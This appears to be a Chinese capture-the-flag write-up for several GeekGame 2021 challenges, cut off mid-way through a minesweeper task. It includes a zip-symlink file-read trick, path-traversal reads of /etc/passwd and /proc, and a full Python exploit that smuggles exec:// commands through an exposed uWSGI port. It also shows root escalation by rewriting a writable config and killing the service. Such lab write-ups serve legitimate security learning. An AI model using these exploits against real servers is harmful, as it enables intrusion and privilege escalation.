\"l\"]..[\"stdout\", \"a\"]..[\"stdout\", \"g\"]..[\"stdout\", \"2\"]..[\"stdout\", \".\"]..[\"stdout\", \"w\"]..[\"stdout\", \"a\"]..[\"stdout\", \"v\"]..[\"stdout\", \" \"]..[\"stdout\", \"-\"]..[\"stdout\", \"p\"]..[\"stdout\", \"\\\"\"]..[\"stdout\", \"\\\"\"]..[\"stdout\", \"\\b\"]..[\"stdout\", \"W\\\"\\b\"]..[\"stdout\", \"a\\\"\\b\"]..[\"stdout\", \"k\\\"\\b\"]..[\"stdout\", \"a\\\"\\b\"]..[\"stdout\", \"r\\\"\\b\"]..[\"stdout\", \"i\\\"\\b\"]..[\"stdout\", \"m\\\"\\b\"]..[\"stdout\", \"a\\\"\\b\"]..[\"stdout\", \"s\\\"\\b\"]..[\"stdout\", \"u\\\"\\b\"]..[\"stdout\", \"!\\\"\\b\"]..[\"stdout\", \" \\\"\\b\"]..[\"stdout\", \"`\\\"\\b\"]..[\"stdout\", \"d\\\"\\b\"]..[\"stdout\", \"a\\\"\\b\"]..[\"stdout\", \"t\\\"\\b\"]..[\"stdout\", \"e\\\"\\b\"]..[\"stdout\", \"`\\\"\\b\"]..[\"stdout\", \" \\\"\\b\"]..[\"stdout\", \"`\\\"\\b\"]..[\"stdout\", \"u\\\"\\b\"]..[\"stdout\", \"n\\\"\\b\"]..[\"stdout\", \"a\\\"\\b\"]..[\"stdout\", \"m\\\"\\b\"]..[\"stdout\", \"e\\\"\\b\"]..[\"stdout\", \" \\\"\\b\"]..[\"stdout\", \"-\\\"\\b\"]..[\"stdout\", \"n\\\"\\b\"]..[\"stdout\", \"o\\\"\\b\"]..[\"stdout\", \"m\\\"\\b\"]..[\"stdout\", \"`\\\"\\b\"]..[\"stdout\", \" \\\"\\b\"]..[\"stdout\", \"`\\\"\\b\"]..[\"stdout\", \"n\\\"\\b\"]..[\"stdout\", \"p\\\"\\b\"]..[\"stdout\", \"r\\\"\\b\"]..[\"stdout\", \"o\\\"\\b\"]..[\"stdout\", \"c\\\"\\b\"]..[\"stdout\", \"`\\\"\\b\"]..[\"stdout\", \"\\r\\n\"].~..[\"stdout\", \"\\r\\n7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21\\r\\np7zip Version 16.02 (locale=en_US.utf8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz (806EC),ASM,AES-NI)\\r\\n\\r\\n\"].~..[\"stdout\", \"Scanning the drive:\\r\\n 0M Scan \\b\\b\\b\\b\\b\\b\\b\\b\\b\\b \\b\\b\\b\\b\\b\\b\\b\\b\\b\\b1 file, 4763436 bytes (4652 KiB)\\r\\n\\r\\nCreating archive: flag2.7z\\r\\n\\r\\nItems to compress: 1\\r\\n\\r\\n\"]..[\"stdout\", \" 0%\"].2[\"stdout\", \"\\b\\b\\b\\b \\b\\b\\b\\b 3% + flag2.wav\"].n[\"stdout\", \"\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b \\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b 29% + flag2.wav\"].p[\"stdout\", \"\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b \\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b 57% 1 + flag2.wav\"].z[\"stdout\", \"\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b \\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b 82% 1 + flag2.wav\"].~..[\"stdout\", \"\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b \\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\b\\r\\nFiles read from disk: 1\\r\\nArchive size: 2935226 bytes (2867 KiB)\\r\\nEverything is Ok\\r\\n\"].`[\"stdout\", \"\\u001b[01;32mroot@you-kali-vm\\u001b[00m:\\u001b[01;34m~/course/geekgame\\u001b[00m# \"].... 还好不多，那就人工提取一下 pip3 install stego-lsb # stegolsb wavsteg balabala # 反正是把 flag2.txt 写入 wav 音频 wavsteg -h -i ki-ringtrain.wav -s flag2.txt -o flag2.wav 7z a flag2.7z flag2.wav -p\"Wakarimasu! `date` `uname -nom` `nproc`\" uname -nom 很明显是 you-kali-vm x86_64 GNU/Linux nproc 通过上面 7z 的执行过程 8 CPUs 可以知道是 8. date 根据流量包的时间戳可以得到大概时间是 Nov 6, 2021 15:44:15.190826000 中国标准时间 这附近。 然而这个的格式不知道啊，试了几种常见的，老半天都不对啊…… 再根据提示 第二阶段提示 Flag 1. You 酱在一边挂着 B 站直播间一边使用 Jupyter Notebook 出题，你只需关心后者 Flag 2. You 酱前几天在服务器上运行了命令 date，并把输出分享给了你：Sat 06 Nov 2021 11:45:14 PM CST 最后得到密码是 Wakarimasu! Sat 06 Nov 2021 03:44:15 PM CST you-kali-vm x86_64 GNU/Linux 8 （为啥我不直接在 kali 里敲 date 试试啊，草 解压得到 flag2.wav 根据上面的输入，可以知道用了 stego-lsb 这个 pypi 库。 参考文档将其恢复出来。 $ stegolsb wavsteg -r -i flag2.wav -o output.txt -n 1 -b 1000 Files read in 0.01s Recovered 1000 bytes in 0.00s Written output file in 0.00s $ cat output.txt 788c3a128994e765373cfc171c00edfb3f603b67f68b087eb69cb8b8508135c5b90920d1b344 然后再还原一下得到 flag。 flag2_en = binascii.unhexlify(\"788c3a128994e765373cfc171c00edfb3f603b67f68b087eb69cb8b8508135c5b90920d1b344\") flag2_de = xor_each(flag2_en, key1) print(flag2_de) flag{ffdbca6ecc5d86cb71cadfd43df36649} 在线解压网站 Q 小网盘可以在线预览多种文件，但是唯独压缩文件不能在线解压。这让小 A 十分难受。 为了解决这个问题，小 A 写了一个在线解压网站。只要你上传zip文件到这个网站，它就会自动帮你解压，之后你就可以访问解压出来的文件了。配合着浏览器插件，可以完美解决 Q 小网盘的痛点。 为了让大家相信他的网站是安全的，不会把压缩文件内容的泄漏给其他人，他在磁盘根目录下放了一个叫 flag 的文件，声称只要能拿到其中内容就可以获得一顿火锅。你以他的网站功能并不完整为理由，想骗取一顿火锅。然而他只是表示这并不影响网站的安全性，只有攻破网站的人才能获得火锅。 你十分生气，铁了心地要吃上这顿免费的火锅。 你可以 下载本题的程序 源码如下。 import os import json from shutil import copyfile from flask import Flask,request,render_template,url_for,send_from_directory,make_response,redirect from werkzeug.middleware.proxy_fix import ProxyFix from flask import jsonify from hashlib import md5 import signal from http.server import HTTPServer, SimpleHTTPRequestHandler os.environ['TEMP']='/dev/shm' app = Flask(\"access\") app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1 ,x_proto=1) @app.route('/',methods=['POST', 'GET']) def index(): if request.method == 'POST': f=request.files['file'] os.system(\"rm -rf /dev/shm/zip/media/*\") path=os.path.join(\"/dev/shm/zip/media\",'tmp.zip') f.save(path) os.system('timeout -k 1 3 unzip /dev/shm/zip/media/tmp.zip -d /dev/shm/zip/media/') os.system('rm /dev/shm/zip/media/tmp.zip') return redirect('/media/') response = render_template('index.html') return response @app.route('/media/',methods=['GET']) @app.route('/media',methods=['GET']) @app.route('/media/&lt;path&gt;',methods=['GET']) def media(path=\"\"): npath=os.path.join(\"/dev/shm/zip/media\",path) if not os.path.exists(npath): return make_response(\"404\",404) if not os.path.isdir(npath): f=open(npath,'rb') response = make_response(f.read()) response.headers['Content-Type'] = 'application/octet-stream' return response else: fn=os.listdir(npath) fn=[\"..\"]+fn f=open(\"templates/template.html\") x=f.read() f.close() ret=\"&lt;h1&gt;文件列表:&lt;/h1&gt;&lt;br&gt;&lt;hr&gt;\" for i in fn: tpath=os.path.join('/media/',path,i) ret+=\"&lt;a href='\"+tpath+\"'&gt;\"+i+\"&lt;/a&gt;&lt;br&gt;\" x=x.replace(\"HTMLTEXT\",ret) return x os.system('mkdir /dev/shm/zip') os.system('mkdir /dev/shm/zip/media') app.run(host=\"0.0.0.0\",port=8080,debug=False,threaded=True) 可以看到对上传的压缩包进行了解压处理，而在 /media/&lt;path&gt; 路由下读取了相应的文件，并返回给前端。 那就很简单啦，整个 symbolic link 符号链接到 /flag，然后 zip 压缩打包进去就完事了。 zip / unzip 的参数（man page） -y ­–symlinks For UNIX and VMS (V8.3 and later), store symbolic links as such in the zip archive, instead of compressing and storing the file referred to by the link. This can avoid multiple copies of files being included in the archive as zip recurses the directory trees and accesses files directly and by links. 注意需要在 Linux 下进行操作（ ln -s /flag meowflag zip --symlink meowflag.zip meowflag 然后上传这个压缩包上去。 下载下来就是 /flag flag{neV3r_trUSt_Any_c0mpresSed_File} 早期人类的聊天室 You 酱有着二十一年网龄，她依稀记得最开始人们是怎么在网上聊天的。那时的网页聊天室功能单一，所有的信息都是纯文本，中文字符甚至需要手动编码，才能发送到网络的另一端。“你今天吃什么？” 亲切的问候顺着这条虚拟的信息管道传达到全世界，可能这就是 管人VPiper 的魅力吧。 现在的年轻人似乎都不懂这种原始的沟通方式了，You 酱很伤心。为了重铸 管人VPiper 荣光，她用最喜欢的 Python 库 Flask 写了一个模拟早期聊天室的网页，希望你也能体会到其中的乐趣。 You 酱记得很清楚，系统上线之前应该关闭调试开关，设置正确的权限，并且用 uwsgi 代替 Flask 的自带服务器。Flag 文件位于磁盘的根目录，即 /flag。 点击 “打开/下载题目” 进入题目网页 补充说明：初次访问时可能遇到 502 错误，这是因为后端尚未启动完成，等几秒后刷新即可 实际上就是个 SSRF 的入口。 随便发点东西，返回的只是固定有限的几个结果，没啥用的亚子。 给了源码 app.py from flask import Flask, redirect, Response, request, render_template import utils, base64 app = Flask(__name__) @app.route('/', methods=['GET', 'POST']) def index(): data = {} data['day'] = utils.get_today() data['server_addr'] = utils.get_default_server() if request.method == 'POST': data['server_addr'] = request.form['server'] data['content'] = request.form['content'] try: base64.b64decode(data['content'].strip(), validate=True) except: data['content'] = base64.b64encode(data['content']) data['response'] = utils.send_msg(data['server_addr'], base64.b64decode(data['content'])) utils.write_chat_log(data['content'], data['response']) return render_template('chatbot.html', data=data) @app.route('/module', methods=['GET']) def module(): if 'name' in request.args: page = request.args.get('name') else: page = 'chatlog' data = {} if 'chatlog' == page: try: logfile = request.args.get('log') \\ or 'chat_log_%s' % utils.get_today() log = open('media/{}'.format(logfile)).read() except: log = 'No chat log' data['log'] = log elif 'chatbot' == page: data['day'] = utils.get_today() else: return redirect('/') return render_template('{}.html'.format(page), data=data) @app.route('/src') def src(): with open(__file__, encoding='utf-8') as f: src = f.read() resp = Response(src) resp.headers['content-type'] = 'text/plain; charset=utf-8' return resp #app.run() 根据源码，我们可以构造 payload 去读取任意文件。 GET /module?log=../utils.py utils.py import socket from time import sleep from datetime import date from pprint import pformat def get_today(): return date.today().strftime('%Y_%m_%d') def var_dump(var): return pformat(var) def get_default_server(): return '127.0.0.1:1234' def send_msg(server_addr, msg): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.settimeout(3) try: (ip, port) = server_addr.strip().split(':') s.connect((ip, int(port))) s.sendall(msg) sleep(1) r = s.recv(2048) s.close() return r.decode('utf8') except Exception as e: s.close() return str(e) def write_chat_log(send, recv): logfile = open('media/chat_log_{}'.format(get_today()), 'a+') logfile.writelines(['you sent ---&gt;\\n', send+'\\n', 'server replied &lt;---\\n', recv+'\\n']) 可以看出是通过 socket 把输入 base64 decode 一下，然后发包，再把结果返回给前端。 刚开始以为是 flask SSTI，于是读了读模板 templates/chatbot.html &lt;!doctype html&gt; &lt;title&gt;Chat Bot!&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"{{ url_for('static', filename='style.css') }}\"&gt; &lt;section class=\"content\"&gt; &lt;form method=\"post\"&gt; &lt;label for=\"server\"&gt;Chatbot Address&lt;/label&gt; &lt;input name=\"server\" type=\"text\" id=\"server\" value=\"{{ data.server_addr }}\" required&gt; &lt;label for=\"content\"&gt;Chat window (base64 encoded)&lt;/label&gt; &lt;textarea name=\"content\" rows=\"22\" cols=\"80\" id=\"content\"&gt;{{ data.content }}&lt;/textarea&gt; &lt;br /&gt; &lt;label for=\"response\"&gt;Chatbot response (base64 encoded)&lt;/label&gt; &lt;textarea name=\"response\" rows=\"22\" cols=\"80\" id=\"response\" readonly&gt;{{ data.response }}&lt;/textarea&gt; &lt;input type=\"submit\" value=\"submit\"&gt; &lt;/form&gt; &lt;p&gt;&lt;a href=\"/module?name=chatlog&amp;log=chat_log_{{ data.day }}\"&gt;Click to view chat log&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=\"/src\"&gt;Open source&lt;/a&gt;&lt;/p&gt; &lt;/section&gt; 然而试了老半天也没成功注入这个 data.content 或者 data.response。 还想了能不能构造个错误请求，在 url 里附带 {{}} 这种，然而发现后端用的 nginx 套 uwsgi，请求的 url 并不会出现在 response 中，遂作罢。 试了试是可以读到 /etc/passwd 之类的，于是想看看这个默认的 1234 端口对应啥程序，以及当前运行的有啥东西，也就是信息收集啦。 先读了读 /proc/self/cmdline，然后爆破了 /proc/&lt;pid&gt;/cmdline，再依次去读相应的配置文件。 chatbot.py 看起来没啥用，只是为了默认的 1234 端口的响应罢了。 #!/usr/bin/env python #coding:utf-8 import socketserver import base64, random class ChatBotServer(socketserver.BaseRequestHandler): def handle(self): conn = self.request while True: data = conn.recv(2048).decode('utf8') if data.strip() == \"exit\": print(\"断开与%s的连接！\" % (self.client_address,)) conn.sendall((b\"%s\\n\" % base64.b64encode('Goodbye!'))) break r = [b'Hello!', b'Alola!', b'Nice to meet you.', b'What a wonderful game!', b'Try again and harder!', b'Good luck to you!'] conn.sendall((b\"%s\\n\" % base64.b64encode(random.choice(r)))) break if __name__ == '__main__': server = socketserver.ThreadingTCPServer(('127.0.0.1', 1234), ChatBotServer) print(\"启动ChatBot！\") server.serve_forever() 确实没啥用 supervisor-ctf.conf [supervisord] logfile=/tmp/supervisord.log ; main log file; default $CWD/supervisord.log logfile_maxbytes=50MB ; max main logfile bytes b4 rotation; default 50MB logfile_backups=0 ; # of main logfile backups; 0 means none, default 10 loglevel=info ; log level; default info; others: debug,warn,trace pidfile=/tmp/supervisord.pid ; supervisord pidfile; default supervisord.pid nodaemon=true ; start in foreground if true; default false silent=false ; no logs to stdout if true; default false minfds=1024 ; min. avail startup file descriptors; default 1024 minprocs=200 ; min. avail process descriptors;default 200 [program:uwsgi] command=uwsgi --ini /tmp/uwsgi-ctf.ini user=root autorestart=true autostart=true startretries=3 redirect_stderr=true startsecs=5 stdout_logfile=/tmp/supervisor.log stopasgroup=true killasgroup=true priority=999 [program:chatbot] command=python /usr/src/ufctf/chatbot.py user=nobody autorestart=true autostart=true startretries=3 redirect_stderr=true startsecs=5 stdout_logfile=/tmp/supervisor.log stopasgroup=true killasgroup=true priority=999 uwsgi-ctf.ini [uwsgi] socket = :3031 chdir = /usr/src/ufctf manage-script-name = true mount = /=app:app master = true uid = nobody gid = nogroup workers = 2 buffer-size = 65535 enable-threads = true pidfile = /tmp/uwsgi.pid GET /module?log=../run.sh #!/bin/sh cd /usr/src/ufctf cp /flagtmp /flag echo \"\" &gt; /flagtmp chown nobody -R . \\ &amp;&amp; chmod 0666 -R /tmp/* \\ &amp;&amp; chown root:root /flag \\ &amp;&amp; chmod 0600 /flag socat UNIX-LISTEN:/sock/socat.sock,fork,reuseaddr TCP4:127.0.0.1:8080 &amp; nginx -c /etc/nginx/nginx.conf exec supervisord -n -c /etc/supervisor-ctf.conf 可以看出 uwsgi 绑定了 0.0.0.0:3031，而且 supervisor 里 uwsgi 是 root 用户跑的，但其 workers 是 nobody。 于是整了老半天就卡住了。 第二阶段提示 把 uwsgi 端口暴露给别人是个危险的事情，可以被用来干坏事。 正确的权限设置能阻止干坏事。错误的权限设置能用来干更多坏事。 果然是 uWSGI 开了端口的锅。 其协议中有一个参数UWSGI_FILE，可以用来忽略原有uWSGI绑定 App，动态设定一个新的文件进行加载执行。这是一个LFI的漏洞，可以任意执行本地存在的任何文件，再结合 uWSGI 程序中默认注册的一系列 schemes，其中有exec协议。于是可以直接通过刚才的UWSGI_FILE变量传参，导致远程执行系统命令。 那就直接利用 hint 里给的 exp 来生成 payload 好了。 刚开始还是先生成一个执行命令，输出写入到临时文件的 payload，再手动在浏览器里执行，然后去读这个临时文件的结果。整了老半天发现还读不到 flag，很难受，于是最后心态崩了，干脆把交互过程一起写了吧。。。唉（ import re import time import base64 import sys import socket import argparse import requests def sz(x): s = hex(x if isinstance(x, int) else len(x))[2:].rjust(4, '0') # if sys.version_info[0] == 3: import bytes s = bytes.fromhex(s) if sys.version_info[0] == 3 else s.decode('hex') return s[::-1] def pack_uwsgi_vars(var): pk = b'' for k, v in var.items() if hasattr(var, 'items') else var: pk += sz(k) + k.encode('utf8') + sz(v) + v.encode('utf8') result = b'\\x00' + sz(pk) + b'\\x00' + pk return result def parse_addr(addr, default_port=None): port = default_port if isinstance(addr, str): if addr.isdigit(): addr, port = '', addr elif ':' in addr: addr, _, port = addr.partition(':') elif isinstance(addr, (list, tuple, set)): addr, port = addr port = int(port) if port else port return (addr or '127.0.0.1', port) def get_host_from_url(url): if '//' in url: url = url.split('//', 1)[1] host, _, url = url.partition('/') return (host, '/' + url) def fetch_data(uri, payload=None, body=None): if 'http' not in uri: uri = 'http://' + uri s = requests.Session() # s.headers['UWSGI_FILE'] = payload if body: import urlparse body_d = dict(urlparse.parse_qsl(urlparse.urlsplit(body).path)) d = s.post(uri, data=body_d) else: d = s.get(uri) return { 'code': d.status_code, 'text': d.text, 'header': d.headers } def ask_uwsgi(addr_and_port, mode, var, body=''): if mode == 'tcp': s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect(parse_addr(addr_and_port)) elif mode == 'unix': s = socket.socket(socket.AF_UNIX) s.connect(addr_and_port) s.send(pack_uwsgi_vars(var) + body.encode('utf8')) response = [] # Actually we dont need the response, it will block if we run any commands. # So I comment all the receiving stuff. # while 1: # data = s.recv(4096) # if not data: # break # response.append(data) s.close() return b''.join(response).decode('utf8') def curl(mode, addr_and_port, payload, target_url): host, uri = get_host_from_url(target_url) path, _, qs = uri.partition('?') if mode == 'http': return fetch_data(addr_and_port+uri, payload) elif mode == 'tcp': host = host or parse_addr(addr_and_port)[0] else: host = addr_and_port var = { 'SERVER_PROTOCOL': 'HTTP/1.1', 'REQUEST_METHOD': 'GET', 'PATH_INFO': path, 'REQUEST_URI': uri, 'QUERY_STRING': qs, 'SERVER_NAME': host, 'HTTP_HOST': host, 'UWSGI_FILE': payload, 'SCRIPT_NAME': target_url } return ask_uwsgi(addr_and_port, mode, var) def exp(command): print(command) host = \"https://prob17-vvm2kfjo.geekgame.pku.edu.cn/\" cmd = 'exec://' + command + \" &gt; /tmp/miao; echo test\" payload = curl('test', \"127.0.0.1:3031\", cmd, '/src') payload_b64 = base64.b64encode(payload) print(payload_b64) print(\"[*]Sending payload.\") r = requests.post( host, data={\"server\": \"127.0.0.1:3031\", \"content\": payload_b64}) print(r.status_code) time.sleep(0.25) print(\"[*]Receiving result.\") r = requests.get(host + '/module?log=../../../../../tmp/miao') print(r.status_code) # print(r.text) result = re.findall(r'&lt;textarea rows=\"50\" cols=\"80\"&gt;(.*?)&lt;/textarea&gt;', r.text, re.S) # print(result) print(result[0]) def main(): # command = \"pkill -9 uwsgi\" command = \"whoami\" command = \"cat /flag\" command = \"ps -ef\" exp(command) if __name__ == '__main__': main() （这个 exp 是最后改好的了 ls -al / 好不容易 RCE 了，但又不是完全 RCE，还得提权啊…… $ whoami nobody $ find / -perm -u=s -type f 2&gt;/dev/null /bin/su /bin/umount /bin/mount /usr/bin/passwd /usr/bin/chsh /usr/bin/gpasswd /usr/bin/newgrp /usr/bin/chfn /usr/lib/openssh/ssh-keysign $ ls -al /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 481608 Mar 13 2021 /usr/lib/openssh/ssh-keysign 看了一下发现这几个貌似都不能执行吧…… /module?log=../../../../../../../tmp/supervisor.log # /tmp/supervisord.log 2021-11-18 08:35:57,151 CRIT Supervisor is running as root. Privileges were not dropped because no user is specified in the config file. If you intend to run as root, you can set user=root in the config file to avoid this message. 2021-11-18 08:35:57,153 INFO supervisord started with pid 8 2021-11-18 08:35:58,156 INFO spawned: 'chatbot' with pid 52 2021-11-18 08:35:58,158 INFO spawned: 'uwsgi' with pid 53 2021-11-18 08:36:03,393 INFO success: chatbot entered RUNNING state, process has stayed up for &gt; than 5 seconds (startsecs) 2021-11-18 08:36:03,393 INFO success: uwsgi entered RUNNING state, process has stayed up for &gt; than 5 seconds (startsecs) $ ps -ef UID PID PPID C STIME TTY TIME CMD root 1 0 0 08:35 ? 00:00:00 /sbin/docker-init -- sh run.sh root 8 1 0 08:35 ? 00:00:01 /usr/local/bin/python /usr/local/bin/supervisord -n -c /etc/supervisor-ctf.conf root 14 8 0 08:35 ? 00:00:00 socat UNIX-LISTEN:/sock/socat.sock,fork,reuseaddr TCP4:127.0.0.1:8080 root 16 1 0 08:35 ? 00:00:00 nginx: master process nginx -c /etc/nginx/nginx.conf www-data 17 16 0 08:35 ? 00:00:00 nginx: worker process www-data 18 16 0 08:35 ? 00:00:00 nginx: worker process www-data 19 16 0 08:35 ? 00:00:00 nginx: worker process www-data 20 16 0 08:35 ? 00:00:00 nginx: worker process www-data 21 16 0 08:35 ? 00:00:00 nginx: worker process www-data 22 16 0 08:35 ? 00:00:00 nginx: worker process www-data 23 16 0 08:35 ? 00:00:00 nginx: worker process www-data 24 16 0 08:35 ? 00:00:00 nginx: worker process www-data 25 16 0 08:35 ? 00:00:00 nginx: worker process www-data 26 16 0 08:35 ? 00:00:00 nginx: worker process www-data 27 16 0 08:35 ? 00:00:00 nginx: worker process www-data 28 16 0 08:35 ? 00:00:00 nginx: worker process www-data 29 16 0 08:35 ? 00:00:00 nginx: worker process www-data 30 16 0 08:35 ? 00:00:00 nginx: worker process www-data 31 16 0 08:35 ? 00:00:00 nginx: worker process www-data 32 16 0 08:35 ? 00:00:00 nginx: worker process www-data 33 16 0 08:35 ? 00:00:00 nginx: worker process www-data 34 16 0 08:35 ? 00:00:00 nginx: worker process www-data 35 16 0 08:35 ? 00:00:00 nginx: worker process www-data 36 16 0 08:35 ? 00:00:00 nginx: worker process www-data 37 16 0 08:35 ? 00:00:00 nginx: worker process www-data 38 16 0 08:35 ? 00:00:00 nginx: worker process www-data 39 16 0 08:35 ? 00:00:00 nginx: worker process www-data 40 16 0 08:35 ? 00:00:00 nginx: worker process www-data 41 16 0 08:35 ? 00:00:00 nginx: worker process www-data 42 16 0 08:35 ? 00:00:00 nginx: worker process www-data 43 16 0 08:35 ? 00:00:00 nginx: worker process www-data 44 16 0 08:35 ? 00:00:00 nginx: worker process www-data 45 16 0 08:35 ? 00:00:00 nginx: worker process www-data 46 16 0 08:35 ? 00:00:00 nginx: worker process www-data 47 16 0 08:35 ? 00:00:00 nginx: worker process www-data 48 16 0 08:35 ? 00:00:00 nginx: worker process nobody 52 8 0 08:35 ? 00:00:00 python /usr/src/ufctf/chatbot.py nobody 53 8 0 08:35 ? 00:00:00 uwsgi --ini /tmp/uwsgi-ctf.ini nobody 56 53 0 08:35 ? 00:00:00 uwsgi --ini /tmp/uwsgi-ctf.ini nobody 57 53 0 08:35 ? 00:00:00 uwsgi --ini /tmp/uwsgi-ctf.ini nobody 69 57 0 08:39 ? 00:00:00 [sh] &lt;defunct&gt; nobody 132 57 0 08:47 ? 00:00:00 [sh] &lt;defunct&gt; nobody 141 57 0 08:49 ? 00:00:00 [sh] &lt;defunct&gt; nobody 152 56 0 08:51 ? 00:00:00 [sh] &lt;defunct&gt; nobody 159 56 0 08:52 ? 00:00:00 [sh] &lt;defunct&gt; nobody 182 57 0 08:55 ? 00:00:00 [sh] &lt;defunct&gt; nobody 198 57 0 08:59 ? 00:00:00 [sh] &lt;defunct&gt; nobody 207 56 0 09:00 ? 00:00:00 [sh] &lt;defunct&gt; nobody 216 56 0 09:09 ? 00:00:00 [sh] &lt;defunct&gt; nobody 223 56 0 09:10 ? 00:00:00 [sh] &lt;defunct&gt; nobody 249 56 0 09:32 ? 00:00:00 [sh] &lt;defunct&gt; nobody 255 56 0 09:33 ? 00:00:00 [sh] &lt;defunct&gt; nobody 264 56 0 09:34 ? 00:00:00 [sh] &lt;defunct&gt; nobody 273 56 0 09:35 ? 00:00:00 [sh] &lt;defunct&gt; nobody 282 56 0 09:37 ? 00:00:00 [sh] &lt;defunct&gt; nobody 295 56 1 09:45 ? 00:00:00 [sh] &lt;defunct&gt; root 303 14 0 09:45 ? 00:00:00 socat UNIX-LISTEN:/sock/socat.sock,fork,reuseaddr TCP4:127.0.0.1:8080 nobody 304 56 0 09:45 ? 00:00:00 /bin/sh -c ps -ef &gt; /tmp/miao; echo test nobody 305 304 0 09:45 ? 00:00:00 ps -ef 这里面可疑的有 nginx，socat，supervisord。 $ pip list Package Version ------------------ -------- click 8.0.3 Flask 2.0.2 importlib-metadata 4.8.2 itsdangerous 2.0.1 Jinja2 3.0.3 MarkupSafe 2.0.1 pip 21.2.4 setuptools 57.5.0 supervisor 4.2.2 typing-extensions 3.10.0.2 uWSGI 2.0.20 Werkzeug 2.0.2 wheel 0.37.0 zipp 3.6.0 supervisor 挺新的，没有 RCE 的 CVE 了。 通过 nginx.conf 进一步读到网页配置文件 nginx-ctf.conf upstream uwsgi { # server unix:///path/to/your/mysite/mysite.sock; # for a file socket server 127.0.0.1:3031; } # configuration of the server server { # the port your site will be served on listen 8080; # the domain name it will serve for server_name localhost; charset utf-8; # max upload size client_max_body_size 2M; # adjust to taste # Django media location /media/ { alias /usr/files/media/; # your Django project's media files - amend as required } location /static/ { alias /usr/files/static/; # your Django project's static files - amend as required } # Finally, send all non-media requests to the uwsgi location / { uwsgi_pass uwsgi; include /etc/nginx/uwsgi_params; # the uwsgi_params file you installed } } 可以知道是代理了 8080 端口给 uwsgi 后端 127.0.0.1:3031，而 run.sh 里有个 socat socat UNIX-LISTEN:/sock/socat.sock,fork,reuseaddr TCP4:127.0.0.1:8080 &amp; 他把这个 8080 又 fork 到了 /sock/socat.sock，可能是为了 docker 部署用的？不懂了。 再回去看 supervisord 和 uwsgi 的配置文件，发现这个 uwsgi-ctf.ini 可写啊！ -rw-rw-rw- 1 root root 210 Nov 11 18:21 /tmp/uwsgi-ctf.ini 而且 uwsgi 是可以自动重启的。 那就可以把里面的 nobody 换成 root，然后 kill 掉原来的让 supervisor 重启，不就完事了！ # sed -i 's/nobody/root/g' /tmp/uwsgi-ctf.ini # 然而不懂为啥没改成功，于是先写到别的文件，再覆盖过去，这里覆盖就别用exp里的了，输出重定向这里单独写 $ sed 's/nobody/root/g' /tmp/uwsgi-ctf.ini &gt; /tmp/test $ cat /tmp/test &gt; /tmp/uwsgi-ctf.ini （赛后看其他师傅wp，原因应该是 sed 替换的时候需要创建临时文件，但题目没法创建临时文件 然后再看这个文件，发现就改好了。 再把 uwsgi kill 掉。 $ pkill -9 uwsgi 等一会儿，发现会有一段时间 502 了，而后又恢复了。 可以看看 /tmp/supervisord.log，发现确实重启了。 看当前用户，就发现是 root 了。 那就能读 flag 了，好耶！太顶了啊！！！ flag{UWSG1_is_n0t_SafE_wheN_SSrf} 另外，还可以通过改 uwsgi 配置文件，用 print = @(/flag) 的形式来把 /flag 包含进来作为启动时打印的信息，然后利用任意读文件漏洞来读日志文件 /tmp/supervisor.log 诡异的网关 2021年，小咕终于把操作系统从 XP 升级到了 Win 7！正如身边同学的装机必备软件是 2345 浏览器、360 安全卫士，小咕刚装好系统就要安装北大网关客户端。 小咕熟练的打开 its，下载，安装，完成！ 但这次的程序，好像……有点不一样？会不会是被黑客篡改过了？ 点击 “打开/下载题目” 下载题目附件 此程序专为本题而设计，请勿用于其他用途 提示：探索程序的 UI 可能带来意外收获。 下载下来，拖进 IDA，这啥啊，算了不逆了。 执行程序，发现 UserID 下面有个 flag，Password 也保存了，就这个了吧。 打开 x64dbg，开始动态调试，调了调，算了，摸了。 直接拿出 星号密码查看器 拖动就完事了。（喵喵懒懒.jpg flag{h0w_diD_you_g3T_th3_passw0rd?} 扫雷 小咕曾是部队里负责扫雷的工兵，退役之后，迷上了电脑上自带的扫雷游戏。 以他的话说，“这是速度与精度的完美结合”。 2021年，小咕终于把操作系统从 XP 升级到了 Win 7！正如身边的人抱怨 Win 11 的华而不实，小咕也感觉升级后的扫雷游戏失去了某种朴素的味道。 但他却无处泄愤。 于是，小咕决定自学编程，实现自己心中完美的扫雷游戏。鉴于玩家水平各异，小咕还实现了 Easy 模式，以纪念首次上阵就踩雷的同志们。 你可以 下载本题的程序 点击 “打开/下载题目” 将打开网页终端，你也可以通过命令 nc prob09.geekgame.pku.edu.cn 10009 手动连接到题目 提示：困难模式对应 Flag 1，简单模式对应 Flag 2。 第二阶段提示 了解一下 Python 随机数的实现。 给了源码 #!/usr/bin/env python3 import random import signal import functools print = functools.partial(print, flush=True) from mylib import show_flag WIDTH = 16 HEIGHT = 16 ROUND_LIMIT = 2000 def gen_board(): bits = random.getrandbits(WIDTH * HEIGHT) board = [[None] * WIDTH for _ in range(HEIGHT)] for i in range(HEIGHT): for j in range(WIDTH): x = (bits &gt;&gt; (i * WIDTH + j)) &amp; 1 board[i][j] = x return board def check_win(board, marks): for i in range(HEIGHT): for j in range(WIDTH): if board[i][j] == 0 and not marks[i][j]: return False return True def near_count(board, x, y): delta = [[1,0],[-1,0],[0,1],[0,-1],[1,1],[1,-1],[-1,1],[-1,-1]] count = 0 for d in delta: tx, ty = x + d[0], y + d[1] if 0 